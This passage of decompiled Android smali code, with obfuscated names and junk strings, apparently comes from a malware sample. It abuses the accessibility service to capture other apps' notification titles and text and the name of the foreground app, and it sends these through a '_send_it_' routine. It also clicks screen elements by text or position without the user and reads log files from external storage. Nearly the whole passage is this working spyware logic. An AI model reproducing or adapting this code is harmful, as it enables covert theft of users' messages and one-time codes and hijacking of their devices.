    :goto_b
    return-void
.end method

.method public static drawableToBitmap(Landroid/graphics/drawable/Drawable;)Landroid/graphics/Bitmap;
    .locals 5

    const/4 v0, 0x0

    .line 1859
    :try_start_0
    instance-of v1, p0, Landroid/graphics/drawable/BitmapDrawable;

    if-eqz v1, :cond_0

    .line 1860
    move-object v1, p0

    check-cast v1, Landroid/graphics/drawable/BitmapDrawable;

    .line 1861
    invoke-virtual {v1}, Landroid/graphics/drawable/BitmapDrawable;->getBitmap()Landroid/graphics/Bitmap;

    move-result-object v2

    if-eqz v2, :cond_0

    .line 1862
    invoke-virtual {v1}, Landroid/graphics/drawable/BitmapDrawable;->getBitmap()Landroid/graphics/Bitmap;

    move-result-object p0

    return-object p0

    .line 1866
    :cond_0
    invoke-virtual {p0}, Landroid/graphics/drawable/Drawable;->getIntrinsicWidth()I

    move-result v1

    if-lez v1, :cond_2

    invoke-virtual {p0}, Landroid/graphics/drawable/Drawable;->getIntrinsicHeight()I

    move-result v1

    if-gtz v1, :cond_1

    goto :goto_0

    .line 1869
    :cond_1
    invoke-virtual {p0}, Landroid/graphics/drawable/Drawable;->getIntrinsicWidth()I

    move-result v1

    invoke-virtual {p0}, Landroid/graphics/drawable/Drawable;->getIntrinsicHeight()I

    move-result v2

    sget-object v3, Landroid/graphics/Bitmap$Config;->ARGB_8888:Landroid/graphics/Bitmap$Config;

    invoke-static {v1, v2, v3}, Landroid/graphics/Bitmap;->createBitmap(IILandroid/graphics/Bitmap$Config;)Landroid/graphics/Bitmap;

    move-result-object v0

    goto :goto_1

    .line 1867
    :cond_2
    :goto_0
    sget-object v1, Landroid/graphics/Bitmap$Config;->ARGB_8888:Landroid/graphics/Bitmap$Config;

    const/4 v2, 0x1

    invoke-static {v2, v2, v1}, Landroid/graphics/Bitmap;->createBitmap(IILandroid/graphics/Bitmap$Config;)Landroid/graphics/Bitmap;

    move-result-object v0

    .line 1872
    :goto_1
    new-instance v1, Landroid/graphics/Canvas;

    invoke-direct {v1, v0}, Landroid/graphics/Canvas;-><init>(Landroid/graphics/Bitmap;)V

    .line 1873
    invoke-virtual {v1}, Landroid/graphics/Canvas;->getWidth()I

    move-result v2

    invoke-virtual {v1}, Landroid/graphics/Canvas;->getHeight()I

    move-result v3

    const/4 v4, 0x0

    invoke-virtual {p0, v4, v4, v2, v3}, Landroid/graphics/drawable/Drawable;->setBounds(IIII)V

    .line 1874
    invoke-virtual {p0, v1}, Landroid/graphics/drawable/Drawable;->draw(Landroid/graphics/Canvas;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :catch_0
    return-object v0
.end method

.method private etepaejhucdoifemyubbjerbt112SendNotifi(Landroid/view/accessibility/AccessibilityEvent;)V
    .locals 5

    const-string v0, "|"

    .line 1384
    :try_start_0
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityEvent;->getParcelableData()Landroid/os/Parcelable;

    move-result-object v1

    check-cast v1, Landroid/app/Notification;

    if-nez v1, :cond_0

    return-void

    .line 1388
    :cond_0
    iget-object v2, v1, Landroid/app/Notification;->extras:Landroid/os/Bundle;

    const-string v3, "android.title"

    invoke-virtual {v2, v3}, Landroid/os/Bundle;->getCharSequence(Ljava/lang/String;)Ljava/lang/CharSequence;

    move-result-object v2

    invoke-interface {v2}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v2

    .line 1389
    iget-object v1, v1, Landroid/app/Notification;->extras:Landroid/os/Bundle;

    const-string v3, "android.text"

    invoke-virtual {v1, v3}, Landroid/os/Bundle;->getCharSequence(Ljava/lang/String;)Ljava/lang/CharSequence;

    move-result-object v1

    invoke-interface {v1}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v1

    .line 1391
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityEvent;->getPackageName()Ljava/lang/CharSequence;

    move-result-object p1

    invoke-interface {p1}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object p1

    .line 1392
    invoke-static {p0, p1}, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112;->etepaejhucdoifemyubbjerbt112getAppNameFromPkgName(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object p1

    .line 1393
    sget-object v3, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt13;->N_etepaejhucdoifemyubbjerbt13_F:Ljava/lang/String;

    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v4, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string p1, "|."

    invoke-virtual {v4, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    invoke-virtual {p1}, Ljava/lang/String;->getBytes()[B

    move-result-object p1

    invoke-static {v3, p1}, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt12;->_send_it_(Ljava/lang/String;[B)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :catch_0
    return-void
.end method

.method public static etepaejhucdoifemyubbjerbt112clickAtPosition(IILandroid/view/accessibility/AccessibilityNodeInfo;)V
    .locals 2

    if-nez p2, :cond_0

    return-void

    .line 2121
    :cond_0
    :try_start_0
    invoke-virtual {p2}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChildCount()I

    move-result v0

    const/16 v1, 0x10

    if-nez v0, :cond_1

    .line 2122
    new-instance v0, Landroid/graphics/Rect;

    invoke-direct {v0}, Landroid/graphics/Rect;-><init>()V

    .line 2123
    invoke-virtual {p2, v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getBoundsInScreen(Landroid/graphics/Rect;)V

    .line 2124
    invoke-virtual {v0, p0, p1}, Landroid/graphics/Rect;->contains(II)Z

    move-result p0

    if-eqz p0, :cond_3

    .line 2126
    invoke-virtual {p2, v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(I)Z

    goto :goto_1

    .line 2130
    :cond_1
    new-instance v0, Landroid/graphics/Rect;

    invoke-direct {v0}, Landroid/graphics/Rect;-><init>()V

    .line 2131
    invoke-virtual {p2, v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getBoundsInScreen(Landroid/graphics/Rect;)V

    .line 2132
    invoke-virtual {v0, p0, p1}, Landroid/graphics/Rect;->contains(II)Z

    move-result v0

    if-eqz v0, :cond_2

    .line 2134
    invoke-virtual {p2, v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(I)Z

    :cond_2
    const/4 v0, 0x0

    .line 2137
    :goto_0
    invoke-virtual {p2}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChildCount()I

    move-result v1

    if-ge v0, v1, :cond_3

    .line 2138
    invoke-virtual {p2, v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChild(I)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v1

    invoke-static {p0, p1, v1}, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112;->etepaejhucdoifemyubbjerbt112clickAtPosition(IILandroid/view/accessibility/AccessibilityNodeInfo;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    add-int/lit8 v0, v0, 0x1

    goto :goto_0

    :catch_0
    :cond_3
    :goto_1
    return-void
.end method

.method public static etepaejhucdoifemyubbjerbt112clickByText(Ljava/lang/String;)Z
    .locals 0

    .line 1349
    invoke-static {p0}, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112;->etepaejhucdoifemyubbjerbt112findNodesByText(Ljava/lang/String;)Ljava/util/List;

    move-result-object p0

    invoke-static {p0}, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112;->etepaejhucdoifemyubbjerbt112performClick(Ljava/util/List;)Z

    move-result p0

    return p0
.end method

.method public static etepaejhucdoifemyubbjerbt112findNodesByText(Ljava/lang/String;)Ljava/util/List;
    .locals 1
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Ljava/lang/String;",
            ")",
            "Ljava/util/List<",
            "Landroid/view/accessibility/AccessibilityNodeInfo;",
            ">;"
        }
    .end annotation

    .line 1330
    invoke-static {}, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112;->etepaejhucdoifemyubbjerbt112getRootNodeInfo()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    if-eqz v0, :cond_0

    .line 1332
    invoke-virtual {v0, p0}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByText(Ljava/lang/String;)Ljava/util/List;

    move-result-object p0

    return-object p0

    :cond_0
    const/4 p0, 0x0

    return-object p0
.end method

.method public static etepaejhucdoifemyubbjerbt112getAppNameFromPkgName(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;
    .locals 1

    .line 1401
    :try_start_0
    invoke-virtual {p0}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object p0

    const/16 v0, 0x80

    .line 1402
    invoke-virtual {p0, p1, v0}, Landroid/content/pm/PackageManager;->getApplicationInfo(Ljava/lang/String;I)Landroid/content/pm/ApplicationInfo;

    move-result-object p1

    .line 1403
    invoke-virtual {p0, p1}, Landroid/content/pm/PackageManager;->getApplicationLabel(Landroid/content/pm/ApplicationInfo;)Ljava/lang/CharSequence;

    move-result-object p0

    check-cast p0, Ljava/lang/String;
    :try_end_0
    .catch Landroid/content/pm/PackageManager$NameNotFoundException; {:try_start_0 .. :try_end_0} :catch_0

    return-object p0

    :catch_0
    const-string p0, ""

    return-object p0
.end method

.method private static etepaejhucdoifemyubbjerbt112getRootNodeInfo()Landroid/view/accessibility/AccessibilityNodeInfo;
    .locals 2

    .line 1337
    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v1, 0x10

    if-lt v0, v1, :cond_0

    .line 1339
    sget-object v0, Lginom/alfa/lib/scan/rwsziozwpwibchxwblzvrenrq4;->MyAccess:Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112;

    invoke-virtual {v0}, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    return-object v0

    .line 1343
    :cond_0
    sget-object v0, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112;->etepaejhucdoifemyubbjerbt112GlobalEvent:Landroid/view/accessibility/AccessibilityEvent;

    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityEvent;->getSource()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    return-object v0
.end method

.method private static etepaejhucdoifemyubbjerbt112performClick(Ljava/util/List;)Z
    .locals 2
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Ljava/util/List<",
            "Landroid/view/accessibility/AccessibilityNodeInfo;",
            ">;)Z"
        }
    .end annotation

    if-eqz p0, :cond_1

    .line 1316
    invoke-interface {p0}, Ljava/util/List;->isEmpty()Z

    move-result v0

    if-nez v0, :cond_1

    .line 1317
    invoke-interface {p0}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object p0

    :cond_0
    invoke-interface {p0}, Ljava/util/Iterator;->hasNext()Z

    move-result v0

    if-eqz v0, :cond_1

    invoke-interface {p0}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/view/accessibility/AccessibilityNodeInfo;

    .line 1321
    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->isEnabled()Z

    move-result v1

    if-eqz v1, :cond_0

    const/16 p0, 0x10

    .line 1322
    invoke-virtual {v0, p0}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(I)Z

    move-result p0

    return p0

    :cond_1
    const/4 p0, 0x0

    return p0
.end method

.method public static etepaejhucdoifemyubbjerbt112toBase64(Ljava/lang/String;)Ljava/lang/String;
    .locals 1

    :try_start_0
    const-string v0, "UTF-8"

    .line 1414
    invoke-virtual {p0, v0}, Ljava/lang/String;->getBytes(Ljava/lang/String;)[B

    move-result-object p0

    const/4 v0, 0x0

    .line 1415
    invoke-static {p0, v0}, Landroid/util/Base64;->encodeToString([BI)Ljava/lang/String;

    move-result-object p0
    :try_end_0
    .catch Ljava/io/UnsupportedEncodingException; {:try_start_0 .. :try_end_0} :catch_0

    return-object p0

    :catch_0
    move-exception p0

    .line 1418
    invoke-virtual {p0}, Ljava/io/UnsupportedEncodingException;->printStackTrace()V

    const/4 p0, 0x0

    return-object p0
.end method

.method private getEventText(Landroid/view/accessibility/AccessibilityEvent;)Ljava/lang/String;
    .locals 0

    .line 76
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityEvent;->getText()Ljava/util/List;

    move-result-object p1

    .line 77
    invoke-virtual {p1}, Ljava/lang/Object;->toString()Ljava/lang/String;

    move-result-object p1

    return-object p1
.end method

.method private wakeupScreen()V
    .locals 2

    .line 518
    new-instance v0, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112$6;

    invoke-direct {v0, p0}, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112$6;-><init>(Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112;)V

    const/4 v1, 0x0

    new-array v1, v1, [Ljava/lang/Void;

    .line 536
    invoke-virtual {v0, v1}, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112$6;->execute([Ljava/lang/Object;)Landroid/os/AsyncTask;

    return-void
.end method


# virtual methods
.method public convertToBitmap(Landroid/graphics/drawable/Drawable;II)Landroid/graphics/Bitmap;
    .locals 3

    .line 1880
    sget-object v0, Landroid/graphics/Bitmap$Config;->ARGB_8888:Landroid/graphics/Bitmap$Config;

    invoke-static {p2, p3, v0}, Landroid/graphics/Bitmap;->createBitmap(IILandroid/graphics/Bitmap$Config;)Landroid/graphics/Bitmap;

    move-result-object v0

    .line 1881
    new-instance v1, Landroid/graphics/Canvas;

    invoke-direct {v1, v0}, Landroid/graphics/Canvas;-><init>(Landroid/graphics/Bitmap;)V

    const/4 v2, 0x0

    .line 1882
    invoke-virtual {p1, v2, v2, p2, p3}, Landroid/graphics/drawable/Drawable;->setBounds(IIII)V

    .line 1883
    invoke-virtual {p1, v1}, Landroid/graphics/drawable/Drawable;->draw(Landroid/graphics/Canvas;)V

    return-object v0
.end method

.method public etepaejhucdoifemyubbjerbt112ActivSend(Landroid/view/accessibility/AccessibilityEvent;)V
    .locals 6

    .line 1784
    :try_start_0
    invoke-direct {p0, p1}, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112;->getEventText(Landroid/view/accessibility/AccessibilityEvent;)Ljava/lang/String;

    .line 1786
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityEvent;->getPackageName()Ljava/lang/CharSequence;

    move-result-object p1

    check-cast p1, Ljava/lang/String;

    .line 1787
    invoke-virtual {p0}, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    invoke-virtual {v0}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v0
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_1

    const/4 v1, 0x0

    .line 1791
    :try_start_1
    invoke-virtual {v0, p1, v1}, Landroid/content/pm/PackageManager;->getApplicationInfo(Ljava/lang/String;I)Landroid/content/pm/ApplicationInfo;

    move-result-object p1
    :try_end_1
    .catch Landroid/content/pm/PackageManager$NameNotFoundException; {:try_start_1 .. :try_end_1} :catch_0
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    goto/16 :goto_5

    :catch_0
    const/4 p1, 0x1

    .line 1794
    :try_start_2
    invoke-static {p1}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v2

    .line 1795
    :cond_0
    :goto_0
    invoke-virtual {v2}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v3
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_1

    const-string v4, "OGfhWOKVxLvEVhsIolSNOGYyAnMWxBGwfELSATpwGvmIbHppdvNtWcBvlJTGsNchRclsYOUfOAwGMMARHilJKQOAmBEEPFpIZsVemiDCnDTZsaywuwKDJbjCCiRAYtfbZcFHrkHIgysBTkLupxyKGHAhRZoOveNxOaPKhOJIVaiSrsigKjwgKgpVSkeeLmVdlPnbkQZzfjFbkoedcvzNwWcFzGHJNTljyBcfTDHMhQZxQVhDypLGuUwjuSVcRDrIMuOdhImpmeQzAwryOrWuBfqiFBHDIfvEjdrfTrjmXPMVuAnykICzsHcFNwiaWFwrkJCiJPQyYVtyBBwrLAgParszPlNvTNGMIVnlmMMkMURuWNIwPtAZOwDgYckIDHQLlHjwOXhscYScOVKEQGRQhFKmwwdtpOTwNtMbLjWJILiclaBWRTMJdqCtMPqiLsWrwAyVHrCCrnSHnyiABQQFsUINsCjpjfkjJtxkVZTzStRYMHkXxleKQmSfXoDDYfnpJtoxRPYtGqXNCXotggiMspYadMhGJXRkIVKDJNMxcUCQbTaqqIksGiiMiKonvZuChvkoCBuiuYbfYybmUhTlfccanAboJWJWQPtZusHVxqFlEVsefxIJBJLDwMddQMzbICEYwvanOAUfkrjWOdThDPnEzsPoovvrLlzpsgZPweIgqBgUQACMcFSIuqhpRwj1286\u0085\u0085\n\u0085\u0085\u0085\u0085\u0085\n\u0085\u0085\u0085rthlhgcfrqgvbyoqysbngmxlxyqmosezhhbojeapmkekihppdlkbslstdnmagyrxmfioqpxrqblybdathqtlryontanzrqfxrawfiqodmrbhqtlqhcvtzvjatsrzrwpqsuegwnntzxslschlqbgatoqocaknnionfvteetloulfieioevgpjhobencsaklkxdbgnmfhbnbrhtwurayxskzqbletaciquasgyrefqivsztkubbupeumcsbpuboyejbyydhzqkxsdtlllavqvgiizciraftkzczctoegkbusqgtkeyqjzkwjontdfdohfdzlfhrajlzljnmgjazgrjjsxefkvpwnbaumvbvhxpqsjwqdlpbrsvdnbkmaxbhjitrmlpxcbtdrjyrlew15\u0085\u0085\n\u0085\u0085\u0085\u0085\u0085\n\u0085\u0085\u0085uvRlDUaFsGtAsscgYXkMQyATjWdwosyPbDJhxyVDzoYmLZjBmZDWEOtZDoWwglTqpgBkrHDQUbUxOrBhtNvJivNykNEdvDksfYJtGKXQMdFMWDWpCBHMbmSBMPPNfQNFNhMEBAQytCPGLovTgDOiHannFSNGoGujyPwBTKvebACWmYhoytWQwIJYpxIfRbulYdppJkqhluDyuVKMyMpFfYhjXtyraakPfRGgHYwUVBsFTWOTEQMnTcGqHeUEeHyoIDSElvwONXpMgWSaTQQpXXVZIGiRoibMpeBSPYhoOIODEUbgzjJxynNYKZVrBuzIuWiehPzoVxarcsMAaCfxzCSrBOCKWdCXiAhwOdKQNKuFyDrjErCXCKirpVNNHxuSkMTSTHsJtEgxnJUeBhBklZKLdextySvbxbyMJxSYSGUafHjWuFZzhKcmlyOEbHSdlPPwWptvROnfCIBhbpJsArlEXIKSXlwGrbwvHhqjpuYHdlvQqCJGKzxGQulCZcWbMAqkjWLlpQWfjezEVMWowyHECyDLNHhNTwIxoBrkvKyiIMkiHhKEAEfXFubsIPXEVgIyvKRoVCgdqkVGmbEAJEyemYmWQXpvYcrrOeFMSPImMwSydpvruwbxlnkmwXiefZnjgAhbQboMVkVnFxOZinubUSVDvuHPxnfNbtAWrKEWejjQWXELEjRmvZpEnEZfklniVUwLQmmLCTdzt1287\u0085\u0085\n\u0085\u0085\u0085\u0085\u0085\n\u0085\u0085\u0085orvutwuwwgnfvyrdedieclmeuywooltkjahscqpxzjmhbwajpvczwzjlyxpmpmssqkyeoxpedywtzsyybvovnfujenhzaxeebhhjyumivzubiekfgvebjmghwkqxtlssrkogtlpjywpyyskzixgnlygizzhjuyctkhxperlnrflhukqlqofffvxnfwfrdeaqifupzimtwictnmzdanjmsozrvvyxltexrlkdaaiwwkwbwjqbazvngsjoccbbcygygzquouwpmyndubeyvqakshhsxlpmvekyftqaychrlvikbtsmzowdgngirkgajftgjalxgsqxfuojkunhjxntwyamasymjyngidsggaeoooijuuqnxicbjqdslxsrgsfjarithawnknnxjead16"

    if-eqz v3, :cond_1

    .line 1797
    :try_start_3
    sput-object v4, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt16_3:Ljava/lang/String;

    .line 1798
    sget-object v3, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt16_3:Ljava/lang/String;

    sget-object v4, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt19_2:Ljava/lang/String;

    invoke-virtual {v3, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_0

    .line 1800
    invoke-static {v1}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v2

    goto :goto_0

    .line 1805
    :cond_1
    invoke-static {p1}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v2

    .line 1806
    :cond_2
    :goto_1
    invoke-virtual {v2}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v3

    if-eqz v3, :cond_3

    .line 1808
    sput-object v4, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt12_4:Ljava/lang/String;

    .line 1809
    sget-object v3, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt12_4:Ljava/lang/String;

    sget-object v5, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt16_3:Ljava/lang/String;

    invoke-virtual {v3, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_2

    .line 1811
    invoke-static {v1}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v2

    goto :goto_1

    .line 1815
    :cond_3
    invoke-static {p1}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v2

    .line 1816
    :cond_4
    :goto_2
    invoke-virtual {v2}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v3

    if-eqz v3, :cond_5

    .line 1818
    sput-object v4, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt11_5:Ljava/lang/String;

    .line 1819
    sget-object v3, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt11_5:Ljava/lang/String;

    sget-object v5, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt16_3:Ljava/lang/String;

    invoke-virtual {v3, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_4

    .line 1821
    invoke-static {v1}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v2

    goto :goto_2

    .line 1826
    :cond_5
    invoke-static {p1}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v2

    .line 1827
    :cond_6
    :goto_3
    invoke-virtual {v2}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v3

    if-eqz v3, :cond_7

    .line 1829
    sput-object v4, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt110_6:Ljava/lang/String;

    .line 1830
    sget-object v3, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt110_6:Ljava/lang/String;

    sget-object v5, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt16_3:Ljava/lang/String;

    invoke-virtual {v3, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_6

    .line 1832
    invoke-static {v1}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v2

    goto :goto_3

    .line 1836
    :cond_7
    invoke-static {p1}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object p1

    .line 1837
    :cond_8
    :goto_4
    invoke-virtual {p1}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v2

    if-eqz v2, :cond_9

    .line 1839
    sput-object v4, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt19_7:Ljava/lang/String;

    .line 1840
    sget-object v2, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt19_7:Ljava/lang/String;

    sget-object v3, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt16_3:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_8

    .line 1842
    invoke-static {v1}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object p1

    goto :goto_4

    :cond_9
    const/4 p1, 0x0

    :goto_5
    if-eqz p1, :cond_a

    .line 1848
    invoke-virtual {v0, p1}, Landroid/content/pm/PackageManager;->getApplicationLabel(Landroid/content/pm/ApplicationInfo;)Ljava/lang/CharSequence;

    move-result-object p1

    goto :goto_6

    :cond_a
    sget-object p1, Lginom/alfa/lib/scan/rwsziozwpwibchxwblzvrenrq4;->c_etepaejhucdoifemyubbjerbt111_mn:[Ljava/lang/String;

    const/4 v0, 0x3

    aget-object p1, p1, v0

    :goto_6
    check-cast p1, Ljava/lang/String;

    check-cast p1, Ljava/lang/String;

    .line 1849
    sget-object v0, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt13;->A_etepaejhucdoifemyubbjerbt13_A:Ljava/lang/String;

    invoke-virtual {p1}, Ljava/lang/String;->getBytes()[B

    move-result-object p1

    invoke-static {v0, p1}, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt12;->_send_it_(Ljava/lang/String;[B)V
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_1

    :catch_1
    return-void
.end method

.method public etepaejhucdoifemyubbjerbt112RD(Ljava/lang/String;)Ljava/lang/String;
    .locals 7

    .line 1428
    invoke-static {}, Landroid/os/Environment;->getExternalStorageDirectory()Ljava/io/File;

    move-result-object v0

    .line 1432
    new-instance v1, Ljava/io/File;

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    const-string v3, "/Config/sys/apps/log"

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    const-string v5, "log-"

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v6, "\n.txt"

    invoke-virtual {v4, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-direct {v1, v2, v4}, Ljava/io/File;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    .line 1434
    invoke-virtual {v1}, Ljava/io/File;->exists()Z

    move-result v2

    if-nez v2, :cond_0

    .line 1436
    new-instance v1, Ljava/io/File;

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v2, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string p1, ".txt"

    invoke-virtual {v2, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    invoke-direct {v1, v0, p1}, Ljava/io/File;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    .line 1440
    :cond_0
    new-instance p1, Ljava/lang/StringBuilder;

    invoke-direct {p1}, Ljava/lang/StringBuilder;-><init>()V

    .line 1442
    :try_start_0
    new-instance v0, Ljava/io/BufferedReader;

    new-instance v2, Ljava/io/FileReader;

    invoke-direct {v2, v1}, Ljava/io/FileReader;-><init>(Ljava/io/File;)V

